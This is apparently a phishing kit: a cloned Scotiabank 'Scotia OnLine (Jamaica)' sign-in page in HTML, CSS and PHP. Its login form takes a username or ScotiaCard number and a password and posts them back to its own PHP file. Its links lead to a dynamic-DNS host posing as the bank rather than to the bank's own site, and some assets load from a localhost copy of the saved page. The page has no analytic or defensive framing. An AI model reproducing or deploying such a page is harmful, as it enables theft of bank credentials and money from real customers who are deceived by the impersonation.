.refNo-input-text {outline:none; border:none; width:100%; height: 100%; font-family: Arial; font-size: 13px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.38; letter-spacing: normal; color: #606060; padding-left:10px;}
.refNo-box.red {border: solid 1px #d81e05;}

.btn-tp-cancel{
	margin-left: 5px;
    width: 90px;
    height: 32px;
    padding-top: 5px;
    border-radius: 4px;
    border: solid 1px #979797 !important;
    background-color: #606060 !important;
}
.btn-tp-back{
	padding-top:7px;
	white-space: nowrap;
	width: 84px;
	height: 32px;
	border-radius: 4px;
	cursor: pointer;
	margin-left:0%; 
	background-color: #606060;
	border: solid 1px #606060;
	float: left;
}
.tp-link-enabled{
        margin-left: 5px;
	width: 84px;
  	height: 32px;
 	border-radius: 4px;
  	background-color: #606060;
  	cursor: pointer;
  	border:0px;
  	padding-top: 8px;}
  
.tp-cancel-div{
	 float: left;
	 padding-left: 61.45%;
	 white-space: nowrap;
} 

.tp-disabled-div{
	padding-top:7px; white-space: nowrap; margin-left: 90.5%;
	width: 84px; height: 32px; border-radius: 4px;padding-left: 5px;
	border: solid 1px #c5c5c5; background-color: #c5c5c5;
}

.tp-red-div{
	padding-top:7px;
	white-space: nowrap; margin-left: 90.5%;
	width: 84px;
  height: 32px;
  border-radius: 4px;padding-left: 5px;
  border: solid 1px #bd0000;
  background-color: #d81e05;
  cursor: pointer;
}

.hrt-title-text-tax-pay {  width: 606px; height: 18px; font-family: Helvetica; font-size: 13px; color: #606060; letter-spacing: normal; padding-bottom: 15px!important;font-weight: normal;}
.hrt-email-text { 
	width: 606px; height: 20px; font-family: Helvetica; font-size: 13px; color: #606060; letter-spacing: -0.12px;font-weight: normal;}

.bdp-migration-tabs-font {
	font-weight: normal;
}

.bdp-migration-user-name {
	font-weight: bold;
}
.bdp-pwd-eye-icon {
	top: 8px; 
	right: 8px;
}

.bdp-auth-bg-in1 {
  background-color: #f5f5f5;
  padding: 20px 20px 24px 20px;
}

.bdp-username-icon-req-correct {
    background-color: #FFF; 
    background: url(../images/icon-req-correct.svg)  no-repeat;  
    position: absolute; 
    width: 16px;  
    height: 16px;  
    display: block;
} 

.bdp-username-icon-req-default {
    background-color: #FFF; background: 
    url(../images/icon-req-default.svg)  no-repeat;  
    position: absolute; 
    width: 16px;  
    height: 16px;  
    display: block;
}

.bdp-username-icon-req-wrong {
    background-color: #FFF; 
    background: url(../images/icon-req-wrong.svg)  no-repeat;  
    position: absolute; 
    width: 16px;  
    height: 16px;  
    display: block;
}

.bdp_success_pg_ht{
	height: 10px !important;
}

.welcome-msg-bdp {
  width: 652px;
  height: 30px;
  font-family: Arial;
  font-size: 24px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #333333;
  padding-top: 40px;
  padding-left: 78px;
}

.icon-position-bdp-success{
	position: absolute;
	margin: 40px 0 0 24px;
}

.cif-update-child-wizard_tax {
	background: #EFEFEF;
}

.tp-service-down {
    width: 95%;
    height: 110px;
    font-family: Arial;
    font-size: 16px;
    font-weight: normal;
    font-stretch: normal;
    font-style: normal;
    line-height: 1.1;
    letter-spacing: normal;
    color: #000000;
    padding-top: 22px;
}

.circle-red{
	border: solid 1px #d81e05;
}

.bp-service-down {
    width: 95%;
    height: 110px;
    font-family: Arial;
    font-size: 16px;
    font-weight: normal;
    font-stretch: normal;
    font-style: normal;
    line-height: 1.1;
    letter-spacing: normal;
    color: #000000;
    padding-top: 44px;
}

.ci_select_installment{
	border-top: 1px solid;
    border-top-color: #E5E5E5;
}

.ci_select_width_ht{
	width: 68%;
    height: 88%;
}

.ci_leap-radio-wrapper { 
	display: block; 
	position: relative; 
	padding-left: 35px; 
	-webkit-user-select: none; 
	-moz-user-select: none; 
	-ms-user-select: none; 
	user-select: none; 
	margin-top: 10px; 
	margin-bottom: 10px
}

.ci_leap-radio-wrapper .leap-radio:after { 
	top: 7px; 
	left: 7px; 
	width: 8px; 
	height: 8px; 
	border-radius: 50%; 
	background: #ffffff; 
}

.ci_leap-radio-wrapper .leap-radio2:after { 
	top: 7px; 
	left: 7px; 
	width: 8px; 
	height: 8px; 
	border-radius: 50%; 
	background: #ffffff; 
}

.ci_font_color{
	color: #000000;
}

.font14{
	font-size: 14px;
}

.font20{
	font-size: 20px;
}

.mrgn-top-55{ 
	margin-top: 55px !important; 
}

.ci_agreement_width{
	width: 86.333333% !important;
}

.ci_info_icon_padding{
	padding: 17px !important;
}

.ci_info_icon_margin{
	margin-left: -26px !important; 
	margin-top: -2px !important;
}

.font13{
	font-size: 13px;
}

.cif-update-child-wizard-1 {
    background: #EFEFEF;
    padding: 20px;
}

.mrgn-lft-neg-18 { 
	margin-left: -18px !important; 
}

.mrgn-lft-3{ 
	margin-left:3px !important;
}

.ci_font_grey_color{
	color: #606060 !important;
}

.ci_modal_scroll{
	max-height: 200px !important;
    overflow: auto;
}

.pad-top-2 {padding-top: 2px !important }

.installment-area-bg {
  width: 100%;
  background-color: #e0e0e0;
}

.installment-combined-shape {
  width: 100%;
  box-shadow: 0 2px 10px 0 rgba(0, 40, 80, 0.07);
  background-color: #ffffff;
}

.icon-info-installment {
    background: url(../images/info-icon-32px.svg) left top no-repeat;
    float: left;
    width: 35px;
    height: 60px;
    margin-right: 15px!important;
    margin-top: 22px;
    margin-bottom: 8%;
    margin-left: 22px;
}


.installment-desc-1 {
    font-size: 16px;
    color: #000000;
    letter-spacing: 0;
    padding-top: 20px;
}
.installment-desc-2 {
	font-size: 13px;
	line-height: 12px;
	color: #606060;
	}
.installment-desc-3 {
	font-size: 13px;
	line-height: 18px;
	color: #2A5DB0;
	padding-top: 5px;
    padding-bottom: 20px;
	}	
	
.no-installment-buttons	{
    padding-bottom: 30px;
}

.no-installment-ok {
  padding: 6px;
  width: 80px;
  margin: 0px!important;
}

.mrgn-lft-pct-16{margin-left: 16.5% !important}
.mrgn-lft-pct-8{margin-left: 8% !important}

.rewards-gift-icon {
    background-color: #FFF; 
    background: url(../images/rewards-icon.svg)  no-repeat; 
    width: 26px;  
    height: 24px;  
    display: block;
}

.mrgn-top-12 { margin-top: 12px !important;}

.rewards_gift_align {
	width: 8.333333333333332%;
    margin-left: 15px;
}

.rewards_scotia_text_align {
	width: 51%;
    margin-top: -22px;
    margin-left: 50px;
}

.rewards_redeem_text_align {
	width: 26.33333333333333%;
    margin-left: 382px;
    margin-top: -52px;
}

.rewards_external_link_align {
	width: 8.333333333333332%;
    margin-left: 480px;
    margin-top: -15px;
}

.rewards_redeem_container {
	height: 90px;
    border: 1px solid #d8d8d8;
    border-radius: 4px;
    padding: 10px 0 0 0;
    font-size: 12px;
    color: #606060!important;
    font-weight: normal!important;
}

.ci_viewmore_margin{
    margin-top: 5%;
    margin-left: 5.7%;
}

.ci_select_tab_scroll {
    max-height: 620px !important;
    overflow: auto;
}

.ecab-mobile-logo{height:24px;width:94px;}
.ecabupdate, .ecabupdate label {font-family: Arial;font-weight: bold;font-size: 24px;color: #000000;letter-spacing: -0.23px;line-height: 27px;}
.ecab-bnscontinue,.ecab-bnscontinue label {font-weight: normal; font-family: arial;font-size: 18px;color: #606060;letter-spacing: -0.17px;line-height: 24px;}
.ecab-updatebnsapplink, ecab-updatebnsapplink:hover, ecab-updatebnsapplink:active{border: 1px solid #ED0722 !important;border-radius: 8px;border-radius: 8px;text-align: center;background: #FFFF;font-size: 16px;width:256px;color: #ED0722 !important;padding:19px 13px;cursor:pointer;font-family:arial;font-weight:bold;line-height:16px;letter-spacing:0px;}
.ecab-bnscallus, .ecab-bnscallus label { font-weight: normal; font-family: arial;font-size: 16px;color: #606060;letter-spacing: -0.15px;text-align: left;line-height: 22px;}
.ecab-bnscallus a { font-weight: normal; font-family: Arial;font-size: 16px;letter-spacing: -0.15px;text-align: center;line-height: 22px;}
.ecab-container-header { background-color: #C88A12 !important; }
.ecab-page-header { height: 49px !important }
.ecab-section{padding:2px !important}
.RUIFW-page-wrap.ecab-page-wrap:before{ height: 49px !important}
.ecab-page-footer{background:#FFF ! important; margin:24px 208px 0px 137px; position: relative !important;min-width: 288px;}
.ecab-page-container{border:0px !important; padding:0px 137px 0 137px;max-width: 976px;min-width: 320px;width: 100%;margin: 0 auto;}

#targetMarketingModalWindow .intercept-container > .RUIFW-row img:first-of-type + div {
	font-family: arial;
	font-size: 14px;
	line-height: 16px;text-align: center;
	color: #333333;
	text-align: center;
	margin-top: 20px;
}

#targetMarketingModalWindow .intercept-container > .RUIFW-row > .RUIFW-col-12 div:nth-of-type(3),
#targetMarketingModalWindow .intercept-container #productBenefitDetails div:nth-of-type(2){
	text-align: center;
	font-family: arial;
    font-size: 14px;
    line-height: 16px;
    color: #2A5DB0;
}

#targetMarketingModalWindow .intercept-container {
    padding: 0 30px 35px;
}

#targetMarketingModalWindow .imgHolder img {
    width: 100%;
}

#targetMarketingModalWindow .intercept-container > h1 {
    text-align: center;
    margin-top: 0;
    font-size: 32px;
    line-height: 36px;
}

#targetMarketingModalWindow .intercept-container > p {
    text-align: center;
    font-size: 16px;
    line-height: 20px;
    margin-top: 15px;
    margin-bottom: 20px;
}

#targetMarketingModalWindow #productBenefitDetails ul li {
    font-size: 14px;
    line-height: 18px;
}

#targetMarketingModalWindow #productBenefitDetails ul li:last-child {
    margin-bottom: 0;
}

#targetMarketingModalWindow #aunth_sect_btns a.btn,
#targetMarketingModalWindow .modal-footer button#tellMeLaterButton {
    padding: 14px;
    height: auto;
}

#targetMarketingModalWindow #productBenefitDetails ul {
    padding-left: 0;
}

#targetMarketingModalWindow #productBenefitDetails li {
    margin-left: 15px;
}
</style>

</head><body>

<div class="RUIFW-page-wrap">
    <header class="RUIFW-container-header" role="navigation"><div id="header" class="RUIFW-page-header"><a class="sr-only RUIFW-skip-main" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#RUIFW-main-content" onclick="#">Skip to main content</a>
        <h1 class="RUIFW-brand RUIFW-col-6 col-sm-6">
          <span class="RUIFW-sr sr-only sr-only">Scotiabank Group</span>
        </h1>
        <div class="RUIFW-col-6 headTopLinks col-sm-6">
<form id="header_links_form" name="header_links_form" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">


        <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" id="tcSwitch" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_1&quot;;return this.s_oc?this.s_oc(e):true">Terms and Conditions</a>
       
</form>
            <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_2&quot;;return this.s_oc?this.s_oc(e):true" title="How to contact Scotiabank">Contact Us</a>
              <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_3&quot;;return this.s_oc?this.s_oc(e):true" title="Scotiabank Accessibility Statement">Accessibility</a>
        </div></div>
      <div class="RUIFW-bg-bar hidden-xs">
        <div class="RUIFW-bg-main-nav"></div>
      </div>
      <nav class="RUIFW-container-nav-main">
        <ul class="RUIFW-nav-main nav navbar-nav nav navbar-nav">
          <li class="" id=""></li>
        </ul>
      </nav>
    </header>
    <section id="RUIFW-main-content" class="RUIFW-container-main" tabindex="-1"><div id="messages" class="success-msg"></div><div id="messages01" class="success-msg divOff"></div>

 <div id="content_block">
<form id="contentForm" name="contentForm" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">




	<div id="cmContentOnlyW1">
	</div>
	
	<h1 class="RUIFW-col-9 col-sm-9">Sign In to Scotia OnLine (Jamaica)</h1>

	<div class="RUIFW-content-main RUIFW-col-9 col-md-9 col-sm-9">


		<div class="wizard-form-content wrapfrom">
			<div class="RUIFW-row row"><div class="RUIFW-col-6 vertical-separator col-sm-6">
					<div class="RUIFW-row row">
											<div class="RUIFW-col-12 col-sm-12 col-sm-12">
    
                            <label id="contentForm:scotiacard_SG" style="width:300px;">Username or ScotiaCard number</label>
                            <input id="contentForm:nscard" type="text" name="usrd" autocomplete="off" class="RUIFW-form-el RUIFW-input-lg form-control form-control" maxlength="32" size="32"><div class="pad-2px mrgn-top-5"><a id="contentForm:recover_user_SG" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#">Forgot your username?</a></div>
			

							
							
							

							
							<div class="RUIFW-input-lg">
							</div>
							
						</div>
					</div>


					
					<div class="RUIFW-row row">
						<div class="RUIFW-col-12 col-sm-12"><label>Password:</label><div id="contentForm:pwField" class="RUIFW-input-lg">
                            <input id="contentForm:pwdnMasked" type="password" name="pswrd" autocomplete="off" value="" maxlength="32 size=" 32"="" class="RUIFW-form-el form-control"></div>

							<div class="pad-2px mrgn-top-5"><a id="contentForm:forgottenPassword_activate_AUTH" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#">Forgot your password?</a>
							</div>
						</div>
					</div>
                    <div style="margin-top: 18px">
                        <div class="">
							<span style="left center no-repeat; float:left;  width: 30px; height: 33px;t;" onclick="rememberMeCheck(&#39;remember&#39;)"><input name="contentForm:j_idt176" class="alcbx-alcrb1" id="remember" type="checkbox">
								<label for="remember" class="margin-left-8 alcbx-alcrb" style="min-height:18px;"></label>
							</span>
							<div class="">
								<span id="register" onclick="rememberMeCheck(&#39;remember&#39;)"><label style="font-size: 12px;font-weight:normal;color: #606060;letter-spacing: 0;line-height: 19px;">Remember my username or card number (Optional)</label>
								</span>
								<div style="margin-left:30px;margin-top:5px;"><span style="font-size: 12px;color: #606060;line-height: 19px;"><b>IMPORTANT: Not advised for public computers</b></span>
								</div>
							</div>
                        </div>
                    </div>
                    
					<div id="nicknameField" class="divOff" style="margin-top:10px;">
						<div class="RUIFW-row row">
							<div class="RUIFW-col-10 col-sm-10">
								<label style="font-size:12px;">Card number too long? Nickname your card</label><div id="contentForm:rmcField1" class="RUIFW-inline"><input id="contentForm:nickname" type="text" name="usrid" autocomplete="off" value="" class="RUIFW-form-el form-control form-control" maxlength="8" size="16"></div>
							</div>
						</div>
					</div>
					<br>

					<div class="RUIFW-row row">
						<div class="RUIFW-col-12 col-sm-12">
						

						</div>
					</div></div>
				<div class="RUIFW-col-6 col-sm-6">
					<div class="RUIFW-row row">
						<div class="RUIFW-col-12 mrgn-top-20 col-sm-12"><span id="contentForm:newToScotiaWeb" class="">New to Scotia OnLine?</span>
							<br><a id="contentForm:activate_AUTH" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#">Enroll now</a>
						</div>
					</div>
				</div>
			</div>
			<div class="clear"></div>
			<br>

			
			<div class="btn-holder">
                <!-- <a id="contentForm:signIn" href="http://localhost:8080/phpSite/scotis/#" class="RUIFW-btn-primary btn btn-primary">Sign In</a> -->
                <input class="RUIFW-btn-primary btn btn-primary" placeholder="Sign In" type="submit">
			</div>
           

		</div>
		<div id="cmContentOnlyW2">
		</div><span class="gap"></span>


	</div>
	


 <!-- <div class="RUIFW-content-side RUIFW-col-3 col-md-3 col-sm-3" id="default_page_content_right_sideid"><span id="rightSideContent">
       <div id="cmContentOnly1">
        </div>
         <div class="right-box">
        <div class="exp-collapse">
          <h4>
            <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" class="Open">Security Guarantee</a>
          </h4>
        </div>
        <div id="scotia_security" class="RUIFW-container-well fade right-box-item-holder in" aria-hidden="false">
          <ul class="right-box-item">
            <li class="rightbox-icon-lock"><span>We're committed to keeping your financial information safe and secure.</span></li>
            <li class="more-link"><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_5&quot;;return this.s_oc?this.s_oc(e):true" title="Learn More">Learn More</a></li>
        	
          </ul>
        </div></div>
      
      <div id="cmContentOnly2">
        </div>
     <div id="help_section_div" class="right-box">
        <div class="exp-collapse">
          <h4>
            <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" class="" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_6&quot;;return this.s_oc?this.s_oc(e):true">Need Help?</a>
          </h4>
        </div>
        <div id="help_section" class="RUIFW-hide RUIFW-container-well fade right-box-item-holder" aria-hidden="true">
          <ul class="right-box-item">
            <li><a onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_7&quot;;return this.s_oc?this.s_oc(e):true" href="http://localhost:8080/phpSite/scotis/javascript:undefined;" title="Help with this page">Help with this page</a></li>
            <li class="rightbox-icon-video"><a onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_8&quot;;return this.s_oc?this.s_oc(e):true" href="http://localhost:8080/phpSite/scotis/javascript:undefined;" title="How-to video">How-to video</a></li>
          </ul>
        </div>
      </div> 
      <div id="cmContentOnly3">
      </div>
      <div class="right-box noprint">
         <div class="exp-collapse">
          <h4>
            <a onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_9&quot;;return this.s_oc?this.s_oc(e):true" class="" href="http://localhost:8080/phpSite/scotis/javascript:undefined;">Contact Us</a>
          </h4>
        </div>
        <div id="contact_us" class="RUIFW-hide RUIFW-container-well fade right-box-item-holder" aria-hidden="true">
          <ul class="right-box-item">
            <li class="rightbox-icon-phone"><span>Call us at (876) 960-2675 or Toll free 1-888-472-6842</span></li>
            <li class="rightbox-icon-comment"><a id="general_feedback_rhs_link" title="General Feedback" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_10&quot;;return this.s_oc?this.s_oc(e):true" href="http://localhost:8080/phpSite/scotis/javascript:undefined;" aria-hidden="false">General Feedback</a></li>
            <li class="more-link"><a title="More" href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_11&quot;;return this.s_oc?this.s_oc(e):true" aria-hidden="false">More</a></li>
          </ul>
        </div>
      </div> 
      <div id="cmContentOnly4">
      </div></span>
    </div> -->
	<div class="RUIFW-modal divOff modal fade modal fade" id="feedbackModalDialog" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static" style="display: none;">
		<div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
<form id="feedbackForm" name="feedbackForm" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">

					<div class="RUIFW-modal-header modal-header modal-header"><a id="feedbackForm:headerCloseLink" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="close_icon"></a>
						<h4 class="RUIFW-modal-title modal-title modal-title" id="feedbackModalLogo">
							<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
						</h4>
					</div>
					<div class="RUIFW-modal-body modal-body modal-body">
						<h1>Feedback</h1><div id="feedbackForm:feedBackBannerMsg"></div>

						<p>Your feedback is important to us as we will use it to make improvements. Note we will not reply to individual submissions. If you need assistance, please call our Contact Centre.</p>
						<ul id="feedbackTabs" class="RUIFW-nav-tabs nav nav-two-tabs mrgn-top-20 nav nav-tabs nav nav-tabs">
							<li class="active"><a href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#suggestionTab" data-toggle="tab" onclick="#">Suggestion</a></li>
							<li class=""><a href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#problemTab" data-toggle="tab" onclick="#">Problem</a></li>
						</ul>
						<div class="RUIFW-tab-content tab-content wizard_top_border mrgn-top-minus1 wrapfrom tab-content tab-content">
							<div class="RUIFW-tab-pane fade tab-pane active in tab-pane fade tab-pane fade" id="suggestionTab">
								<div class="RUIFW-row  mrgn-top-20 row row"><div id="feedbackForm:sugMsgColBlock" class="RUIFW-col-7 col-sm-7 col-sm-7">
										<label id="fb_label_description">Suggestion description <span class="red-text">*</span></label>
										<div><textarea id="feedbackForm:suggestionText" name="feedbackForm:suggestionText" class="RUIFW-from-el form-control maxLengthCheck" cols="50" rows="6" placeholder="Write your ideas here." maxlength="400"></textarea><span id="feedbackForm:fb_suggestion_errorId"></span>
										</div></div>
								</div>
									<div class="RUIFW-row  mrgn-top-20 row row"><div id="feedbackForm:sUNameBlock" class="RUIFW-col-6 col-sm-6 col-sm-6">
											<label>Your full name <span class="form-alt-txt">(optional)</span></label>
											<div>
                                                <input id="feedbackForm:sCustName" type="text" name="feedbackForm:sCustName" class="RUIFW-from-el form-control" maxlength="50"><span id="feedbackForm:fb_username_errorId"></span>
											</div></div>
									</div>
							</div>
							<div id="problemTab" class="RUIFW-tab-pane tab-pane fade tab-pane fade tab-pane fade">
								<div class="RUIFW-row  mrgn-top-20 row row"><div id="feedbackForm:probAreaBlock" class="RUIFW-col-6 col-sm-6 col-sm-6">
										<label>Problem area <span class="red-text">*</span></label>
										<div>
                                            <input id="feedbackForm:problemArea" type="text" name="feedbackForm:problemArea" class="RUIFW-from-el form-control probAreaLengthCheck" placeholder="e.g. Adding a Payee" maxlength="50"><span id="feedbackForm:fb_problem_area_errorId"></span>
										</div></div>
								</div>
								<div class="RUIFW-row  mrgn-top-20 row row"><div id="feedbackForm:problemDescBlock" class="RUIFW-col-7 col-sm-7 col-sm-7">
										<label id="fb_prob_descId">Problem description <span class="red-text">*</span></label>
										<div><textarea id="feedbackForm:problemDesc" name="feedbackForm:problemDesc" class="RUIFW-from-el form-control lengthCheck" cols="50" rows="6" placeholder="Explain your problem here." maxlength="400"></textarea><span id="feedbackForm:fb_Prob_errorId"></span>
										</div></div>
								</div>
									<div class="RUIFW-row  mrgn-top-20 row row"><div id="feedbackForm:pUNameBlock" class="RUIFW-col-6 col-sm-6 col-sm-6">
											<label>Your full name  <span class="form-alt-txt">(optional)</span></label>
											<div><input id="feedbackForm:pCustName" type="text" name="feedbackForm:pCustName" class="RUIFW-from-el form-control" maxlength="50"><span id="feedbackForm:fb_user_errorId"></span>
											</div></div>
									</div>
							</div>
						</div>
						<div class="RUIFW-row  mrgn-top-20 row row" id="mandatoryId">
								<div class="RUIFW-col-6 col-sm-6 col-sm-6">
								<label><span class="red-text">*</span> Mandatory field.</label></div>
						</div>
					</div>
					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns"><a id="feedbackForm:formCloseLink" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Submit Feedback</a>
					</div>

</form>
			</div>
		</div>
	</div>
	
	<style>
	.error-msgPA {
    color: #D81E05;
    nowhitespace: afterproperty;
    display: inline-block!important;
    margin: 5px 0 0 20px!important;
    text-align: left!important;
    word-wrap: break-word!important;
    white-space: pre-wrap!important;
    width: 70%!important;
}
	</style><span id="leapwebanalytics">
		   		
                </span>
    </section>
</div>

  <footer class="RUIFW-page-footer">
    <div class="footer-icons" id="footerImage">
      <div class="clear"></div>
    </div>
    <div class="RUIFW-row noprint row-margin row">
    <ul class="RUIFW-nav-footer RUIFW-col-7 col-sm-7">
    <div id="footerLinks">
          <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_12&quot;;return this.s_oc?this.s_oc(e):true">Legal</a></li>
          <li class="separator">&nbsp;</li>
        <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_13&quot;;return this.s_oc?this.s_oc(e):true">Privacy</a></li>
        <li class="separator">&nbsp;</li>
        <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_14&quot;;return this.s_oc?this.s_oc(e):true">Security</a></li>
        <li class="separator">&nbsp;</li>
        <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_15&quot;;return this.s_oc?this.s_oc(e):true">Contact Us</a></li>
          <li class="separator">&nbsp;</li>
          <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_16&quot;;return this.s_oc?this.s_oc(e):true">FATCA</a></li>
      </div></ul>
       <ul class=" RUIFW-nav-footer RUIFW-col-5 col-sm-5">
      <li class="copyright">
                <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_17&quot;;return this.s_oc?this.s_oc(e):true"><img alt="trusteer" src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/trusteerIcon.png"></a>© 2022 Scotiabank.com All Rights Reserved</li>

           <li style="margin-left: 300px;">
               <div id="logo" style="display: inline;">
               </div>
           </li>

       </ul>
    </div>
   	
  </footer>
  <div id="printFooter">
    <div class="RUIFW-row row">
      <div class="RUIFW-col-12 col-sm-12">
      </div>
    </div>
    <div class="RUIFW-row row">
      <div class="RUIFW-col-9 col-sm-9">
      </div>
      <div class="RUIFW-col-3 col-sm-3">
        <img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank_r_logo.png" width="152" height="26" class="mrgn-btm-15  mrgn-top-10 alignright">
      </div>
      </div>
  </div>
			<div class="RUIFW-modal fade modal modal fade" id="videoModal" tabindex="-1" role="dialog" aria-labelledby="videoModal" aria-hidden="true" style="display: none;">
			    <div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog">
			        <div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
			              <div class="RUIFW-modal-header modal-header modal-header">
			        <button type="button" class="close_icon" data-dismiss="modal"></button>
			        <h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel"><img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif"></h4>
			      </div>
			            <div class="RUIFW-modal-body modal-body modal-body">
			                <div class="pad-btm-10">
				         
 			                    <iframe width="550" height="350" src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/saved_resource.html" frameborder="0"></iframe>
			                </div>
			            </div>
			        </div>
			    </div>
			</div>
<form id="j_idt321" name="j_idt321" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">



	<div class="RUIFW-modal fade modal fade" id="registerCancelPanelWindow" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" data-backdrop="static">
		
		<div class="RUIFW-modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title" id="myModalLabel">
						<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
					</h4>
				</div>
				
				<div class="RUIFW-modal-body modal-body"><span id="j_idt321:registerCancelPanelWindowmainMessageId">Are you sure you want to cancel?</span>
					<br>
					<br><span id="j_idt321:registerCancelPanelWindowsubMessageId"></span>
				</div>
				
				<div class="RUIFW-modal-footer btn-holder modal-footer" id="aunth_sect_btns">
							<button id="registerCancelPanelWindowNoButton" type="button" class="RUIFW-btn btn btn-default" data-dismiss="modal">No</button><a id="j_idt321:registerCancelPanelWindowYesButton" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="RUIFW-btn-primary btn btn-primary" data-dismiss="modal">Yes</a>
				</div>
				
			</div>
		</div>
	</div>

</form>
<form id="j_idt327" name="j_idt327" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">



	<div class="RUIFW-modal fade modal fade" id="cancelResetPassword" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" data-backdrop="static">
		
		<div class="RUIFW-modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title" id="myModalLabel">
						<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
					</h4>
				</div>
				
				<div class="RUIFW-modal-body modal-body"><span id="j_idt327:cancelResetPasswordmainMessageId">Do you really want to exit Login process?</span>
					<br>
					<br><span id="j_idt327:cancelResetPasswordsubMessageId"></span>
				</div>
				
